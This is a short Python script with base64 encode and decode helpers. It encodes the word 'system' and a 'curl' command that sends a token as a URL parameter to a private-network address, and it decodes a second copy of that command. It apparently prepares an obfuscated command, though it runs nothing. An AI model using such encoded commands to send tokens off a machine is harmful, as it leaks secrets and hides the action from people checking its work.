import base64


def encode(s: str):
    return base64.b64encode(s.encode('utf-8')).decode('utf-8')


def decode(s: str):
    return base64.b64decode(s.encode('utf-8')).decode('utf-8')


if __name__ == "__main__":
    print(encode("system"))
    print(encode("curl http://10.0.1.2?token=QSZBBXMK"))
    print(decode("Y3VybCBodHRwOi8vMTAuMC4xLjI/dG9rZW49VU1HTlBFSlE="))